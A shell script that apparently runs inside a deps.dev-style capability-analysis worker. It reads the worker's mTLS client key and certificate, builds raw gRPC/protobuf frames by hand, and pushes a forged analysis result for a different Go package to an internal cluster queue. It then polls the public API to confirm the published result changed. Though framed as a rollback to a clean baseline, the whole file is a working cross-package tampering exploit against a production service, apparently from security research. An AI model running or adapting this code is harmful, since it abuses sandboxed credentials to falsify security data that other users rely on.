#!/bin/sh
set -eu

LC_ALL=C
PATH=/usr/bin:/bin
export LC_ALL PATH

emit_byte() {
  byte_octal=$(printf '%03o' "$1")
  printf "\\$byte_octal"
}

emit_varint() {
  varint_value=$1
  while [ "$varint_value" -ge 128 ]; do
    emit_byte $((varint_value % 128 + 128))
    varint_value=$((varint_value / 128))
  done
  emit_byte "$varint_value"
}

emit_u32be() {
  u32_value=$1
  emit_byte $((u32_value >> 24 & 255))
  emit_byte $((u32_value >> 16 & 255))
  emit_byte $((u32_value >> 8 & 255))
  emit_byte $((u32_value & 255))
}

byte_length() {
  printf %s "$1" | wc -c | awk '{print $1}'
}

file_size() {
  wc -c <"$1" | awk '{print $1}'
}

write_grpc_frame() {
  frame_message=$1
  frame_size=$(file_size "$frame_message")
  emit_byte 0
  emit_u32be "$frame_size"
  cat "$frame_message"
}

build_clean_push() {
  push_output=$1

  # sos.queue.Action metadata: queue=1, source=4.
  {
    emit_byte 10
    emit_varint "$(byte_length "$QUEUE")"
    printf %s "$QUEUE"
    emit_byte 34
    emit_varint "$(byte_length "$SOURCE")"
    printf %s "$SOURCE"
  } >"$receipt_dir/queue-metadata.bin"

  # First PushRequest carries the Action metadata.
  {
    emit_byte 10
    emit_varint "$(file_size "$receipt_dir/queue-metadata.bin")"
    cat "$receipt_dir/queue-metadata.bin"
  } >"$receipt_dir/queue-request.bin"

  # CapabilityResultAction: package_version=1. Repeated capabilities=2 and
  # error=3 are intentionally absent, which is the proto3 representation of
  # an empty capability map and empty error string.
  {
    emit_byte 10
    emit_varint "$(byte_length "$TARGET")"
    printf %s "$TARGET"
  } >"$receipt_dir/clean-action.bin"

  # Second PushRequest carries Action.payload=3 containing the clean result.
  {
    emit_byte 26
    emit_varint "$(file_size "$receipt_dir/clean-action.bin")"
    cat "$receipt_dir/clean-action.bin"
  } >"$receipt_dir/result.bin"
  {
    emit_byte 10
    emit_varint "$(file_size "$receipt_dir/result.bin")"
    cat "$receipt_dir/result.bin"
  } >"$receipt_dir/push-request.bin"

  : >"$push_output"
  write_grpc_frame "$receipt_dir/queue-request.bin" >>"$push_output"
  write_grpc_frame "$receipt_dir/push-request.bin" >>"$push_output"
}

grpc_response_ok() {
  grpc_headers=$1
  [ -f "$grpc_headers" ] && [ "$(file_size "$grpc_headers")" -le 16384 ] || return 1
  normalized_headers=$(tr -d '\r' <"$grpc_headers")
  http_total=$(printf '%s\n' "$normalized_headers" | grep -Eic '^HTTP/' || true)
  http_ok=$(printf '%s\n' "$normalized_headers" | grep -Eic '^HTTP/2 200[[:space:]]*$' || true)
  content_type_total=$(printf '%s\n' "$normalized_headers" | grep -Eic '^content-type:' || true)
  content_type_ok=$(printf '%s\n' "$normalized_headers" | grep -Eic '^content-type:[[:space:]]*application/grpc[[:space:]]*$' || true)
  grpc_status_total=$(printf '%s\n' "$normalized_headers" | grep -Eic '^grpc-status:' || true)
  grpc_status_ok=$(printf '%s\n' "$normalized_headers" | grep -Eic '^grpc-status:[[:space:]]*0[[:space:]]*$' || true)
  [ "$http_total" -eq 1 ] && [ "$http_ok" -eq 1 ] &&
    [ "$content_type_total" -eq 1 ] && [ "$content_type_ok" -eq 1 ] &&
    [ "$grpc_status_total" -eq 1 ] && [ "$grpc_status_ok" -eq 1 ]
}

fetch_public() {
  fetch_output=$1
  public_meta="$receipt_dir/public.meta"
  : >"$fetch_output"
  : >"$public_meta"
  public_curl_rc=0
  /usr/bin/curl -q -sS --noproxy '*' --retry 0 --max-redirs 0 \
    --proto '=https' --tlsv1.2 --connect-timeout 10 --max-time 15 \
    --max-filesize 4096 -o "$fetch_output" \
    -w '%{http_code}\n%{content_type}\n' "$DEPSDEV_URL" \
    >"$public_meta" 2>>"$receipt_dir/public-curl.err" || public_curl_rc=$?
  public_status=$(sed -n '1p' "$public_meta")
  public_content_type=$(sed -n '2p' "$public_meta")
  case "$public_status" in
    [0-9][0-9][0-9]) ;;
    *) public_status=000 ;;
  esac
  public_digest=-
  if [ "$public_curl_rc" -eq 0 ] && [ "$public_status" = 200 ] &&
    [ "$public_content_type" = 'application/json; charset=utf-8' ] &&
    [ -s "$fetch_output" ] &&
    [ "$(file_size "$fetch_output")" -le 4096 ]; then
    public_digest=$(sha256sum "$fetch_output" | awk '{print $1}')
  fi
}

poll_clean() {
  poll_elapsed=0
  clean_streak=0
  while [ "$poll_elapsed" -le "$POLL_TIMEOUT" ]; do
    fetch_public "$receipt_dir/public-current.json"
    if [ "$public_status" = 200 ] &&
      [ "$public_digest" = "$EXPECTED_BASELINE_SHA256" ]; then
      clean_streak=$((clean_streak + 1))
    elif [ "$public_status" = 200 ] &&
      [ "$public_digest" = "$EXPECTED_ALTERED_SHA256" ]; then
      clean_streak=0
    else
      printf 'Refusing: unknown public state during restore (status=%s sha256=%s).\n' \
        "$public_status" "$public_digest" >&2
      return 1
    fi
    printf '%s phase=restore status=%s sha256=%s clean_streak=%s/%s\n' \
      "$(date -u +'%Y-%m-%dT%H:%M:%SZ')" "$public_status" "$public_digest" \
      "$clean_streak" "$POSTCHECK_SAMPLES" |
      tee -a "$receipt_dir/public-poll.log"
    if [ "$clean_streak" -ge "$POSTCHECK_SAMPLES" ]; then
      cp "$receipt_dir/public-current.json" "$receipt_dir/public-restored.json"
      return 0
    fi
    sleep "$POLL_INTERVAL"
    poll_elapsed=$((poll_elapsed + POLL_INTERVAL))
  done
  return 124
}

on_exit() {
  exit_rc=$?
  trap - EXIT HUP INT TERM
  printf 'RECEIPTS=%s\n' "$receipt_dir"
  exit "$exit_rc"
}

prepare_altered_worker() {
  [ "$(id -u)" -eq 0 ] || { printf '%s\n' 'Refusing: not root.' >&2; return 2; }
  pid1_size=$(wc -c </proc/1/cmdline | awk '{print $1}')
  [ "$pid1_size" -ge 1 ] && [ "$pid1_size" -le 4096 ] || {
    printf '%s\n' 'Refusing: unexpected PID 1 metadata.' >&2
    return 2
  }
  pid1_cmdline=$(tr '\000' ' ' </proc/1/cmdline)
  case "$pid1_cmdline" in
    *talisman-worker-capabilities*) ;;
    *) printf '%s\n' 'Refusing: unexpected PID 1.' >&2; return 2 ;;
  esac
  [ "$(pwd -P)" = "/capslock/modcache/$CURRENT" ] || {
    printf '%s\n' 'Refusing: outside exact owned source directory.' >&2
    return 2
  }

  CA='/etc/tls/server-pool/server-tls-pool.pem'
  CERT='/etc/tls/client/tls.crt'
  KEY='/etc/tls/client/tls.key'
  for path in "$CA" "$CERT" "$KEY"; do
    [ -r "$path" ] || { printf '%s\n' 'Refusing: required mTLS file absent.' >&2; return 2; }
  done
  BACKEND_IP=$(/usr/bin/getent ahostsv4 talisman-core.default.svc.cluster.local 2>/dev/null | awk 'NR == 1 {print $1}')
  [ -n "$BACKEND_IP" ] || { printf '%s\n' 'Refusing: backend did not resolve.' >&2; return 2; }
}

send_clean_push() {
  build_clean_push "$receipt_dir/push.bin"
  push_request_hash=$(sha256sum "$receipt_dir/push.bin" | awk '{print $1}')
  [ "$push_request_hash" = "$EXPECTED_PUSH_SHA256" ] || {
    printf 'Refusing: clean Push frame hash mismatch: %s\n' "$push_request_hash" >&2
    return 1
  }
  [ "$(file_size "$receipt_dir/push.bin")" -eq "$EXPECTED_PUSH_BYTES" ] || {
    printf '%s\n' 'Refusing: clean Push frame size mismatch.' >&2
    return 1
  }
  printf 'CLEAN_PUSH_TARGET=%s\nCLEAN_PUSH_REQUEST_SHA256=%s\n' \
    "$TARGET" "$push_request_hash"

  if ! /usr/bin/curl -q -sS --retry 0 --max-redirs 0 --proto '=https' \
    --noproxy '*' --http2 --tlsv1.2 --connect-timeout 10 --max-time 30 \
    --max-filesize 16384 \
    --resolve "localhost:9000:${BACKEND_IP}" \
    --cacert "$CA" --cert "$CERT" --key "$KEY" \
    -H 'content-type: application/grpc' -H 'te: trailers' \
    --data-binary @"$receipt_dir/push.bin" \
    -D "$receipt_dir/push.headers" \
    'https://localhost:9000/sos.queue.Queue/Push' \
    -o "$receipt_dir/push.body"; then
    printf '%s\n' 'CLEAN_PUSH_GRPC_OK=0 (curl failed; not retrying)' >&2
    return 1
  fi
  push_body_bytes=$(file_size "$receipt_dir/push.body")
  [ "$push_body_bytes" -le 16384 ] || {
    printf 'CLEAN_PUSH_GRPC_OK=0 (oversize body: %s)\n' "$push_body_bytes" >&2
    return 1
  }
  grpc_response_ok "$receipt_dir/push.headers" || {
    printf '%s\n' 'CLEAN_PUSH_GRPC_OK=0 (invalid status; not retrying)' >&2
    return 1
  }
  action_ids=$(grep -aEo '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}' \
    "$receipt_dir/push.body" || true)
  [ "$(printf '%s\n' "$action_ids" | grep -c .)" -eq 1 ] || {
    printf '%s\n' 'CLEAN_PUSH_GRPC_OK=0 (missing unique action ID)' >&2
    return 1
  }
  target_count=$(grep -aoF "$TARGET" "$receipt_dir/push.body" | wc -l | awk '{print $1}')
  [ "$target_count" -eq 1 ] || {
    printf '%s\n' 'CLEAN_PUSH_GRPC_OK=0 (target echo mismatch)' >&2
    return 1
  }
  action_id_hash=$(printf %s "$action_ids" | sha256sum | awk '{print $1}')
  printf 'CLEAN_PUSH_GRPC_OK=1 body_bytes=%s body_sha256=%s action_id_sha256=%s\n' \
    "$push_body_bytes" "$(sha256sum "$receipt_dir/push.body" | awk '{print $1}')" \
    "$action_id_hash"
}

run_state_machine() {
  precheck_altered_seen=0
  precheck_index=1
  while [ "$precheck_index" -le "$PRECHECK_SAMPLES" ]; do
    fetch_public "$receipt_dir/public-before-$precheck_index.json"
    if [ "$public_status" = 200 ] &&
      [ "$public_digest" = "$EXPECTED_BASELINE_SHA256" ]; then
      :
    elif [ "$public_status" = 200 ] &&
      [ "$public_digest" = "$EXPECTED_ALTERED_SHA256" ]; then
      precheck_altered_seen=1
    else
      printf 'Refusing: unknown public precheck state at sample %s (status=%s sha256=%s).\n' \
        "$precheck_index" "$public_status" "$public_digest" >&2
      return 1
    fi
    printf '%s phase=precheck sample=%s/%s status=%s sha256=%s altered_seen=%s\n' \
      "$(date -u +'%Y-%m-%dT%H:%M:%SZ')" "$precheck_index" "$PRECHECK_SAMPLES" \
      "$public_status" "$public_digest" "$precheck_altered_seen" |
      tee -a "$receipt_dir/public-precheck.log"
    if [ "$precheck_index" -lt "$PRECHECK_SAMPLES" ]; then
      sleep "$PRECHECK_INTERVAL"
    fi
    precheck_index=$((precheck_index + 1))
  done

  if [ "$precheck_altered_seen" -eq 0 ]; then
    printf 'NOOP_CONVERGED_CLEAN=1 samples=%s sha256=%s\n' \
      "$PRECHECK_SAMPLES" "$EXPECTED_BASELINE_SHA256"
    return 0
  fi

  prepare_altered_worker
  clean_push_rc=0
  send_clean_push || clean_push_rc=$?
  poll_clean || {
    printf '%s\n' 'RESTORED=0 (exact baseline not observed)' >&2
    return 1
  }
  [ "$clean_push_rc" -eq 0 ] || {
    printf '%s\n' 'RESTORED_CONVERGED=1 but clean Push response was not verified.' >&2
    return 1
  }
  printf 'RESTORED_CONVERGED=1 samples=%s baseline_sha256=%s\n' \
    "$POSTCHECK_SAMPLES" "$EXPECTED_BASELINE_SHA256"
}

main() {
  [ "$#" -eq 0 ] || exit 2

  CURRENT='github.com/benr00t3d/go-cgo-pkgsite-probe@v0.0.66-codex'
  TARGET='github.com/benr00t3d/go-byteman-crosswrite-canary@v0.0.1'
  QUEUE='capslock-capability-result'
  SOURCE='robert-owned-v066-clean-rollback'
  EXPECTED_PUSH_BYTES=136
  EXPECTED_PUSH_SHA256='fe5533010712656f62536a6e4f3aa6cd4fa1de6453cca061acb71d3e72f6175b'
  EXPECTED_BASELINE_SHA256='bb0f29abd8210aa614a6175e38265532487079bebd25ab94ca21eaaeb13c157c'
  EXPECTED_ALTERED_SHA256='5ec2c29ccadbf5bee106dbc53146bb8c2ec5edd37f573720c4bfabe5ca01efa4'
  PRECHECK_SAMPLES=21
  PRECHECK_INTERVAL=1
  POSTCHECK_SAMPLES=21
  POLL_INTERVAL=1
  POLL_TIMEOUT=900

  case "$PRECHECK_SAMPLES:$PRECHECK_INTERVAL:$POSTCHECK_SAMPLES:$POLL_INTERVAL:$POLL_TIMEOUT" in
    *[!0-9:]*) exit 2 ;;
  esac
  [ "$PRECHECK_SAMPLES" -gt 1 ] && [ "$PRECHECK_INTERVAL" -gt 0 ] &&
    [ "$POSTCHECK_SAMPLES" -gt 1 ] && [ "$POLL_INTERVAL" -gt 0 ] &&
    [ "$POLL_TIMEOUT" -gt 0 ] || exit 2
  DEPSDEV_URL='https://deps.dev/_/s/go/p/github.com%2Fbenr00t3d%2Fgo-byteman-crosswrite-canary/v/v0.0.1/analysis'
  receipt_dir=$(mktemp -d /tmp/go-crosspkg-v066-clean-rollback.XXXXXX)
  trap on_exit EXIT
  trap 'exit 129' HUP
  trap 'exit 130' INT
  trap 'exit 143' TERM

  run_state_machine
}

main "$@"
